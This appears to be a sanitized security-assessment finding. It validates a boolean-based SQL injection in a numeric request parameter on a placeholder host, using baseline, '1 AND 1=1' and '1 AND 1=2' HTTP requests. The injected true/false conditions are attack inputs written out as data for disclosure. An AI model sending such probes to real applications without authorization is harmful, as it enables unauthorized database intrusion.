# F-01 Technical Validation

> Sanitized reconstruction. Original host, paths, parameter names, session material, and response content are replaced. The request method, numeric parameter context, and true/false validation sequence reflect the confirmed test.

## Baseline

```http
POST /?object=1 HTTP/1.1
Host: app.example.test
Content-Type: application/x-www-form-urlencoded

action=detail&state=[redacted]
```

The application returned the expected detail view.

## Boolean condition comparison

The object parameter was modified while the rest of the request context remained unchanged:

```http
POST /?object=1%20AND%201%3D1 HTTP/1.1
Host: app.example.test
Content-Type: application/x-www-form-urlencoded

action=detail&state=[redacted]
```

The response remained consistent with the true condition and the normal detail path.

```http
POST /?object=1%20AND%201%3D2 HTTP/1.1
Host: app.example.test
Content-Type: application/x-www-form-urlencoded

action=detail&state=[redacted]
```

The false condition produced a repeatable difference in the returned content and response characteristics.

## Security conclusion

Deterministic behavior across repeated true/false conditions demonstrated that attacker-controlled input in the numeric object parameter influenced backend SQL query logic.
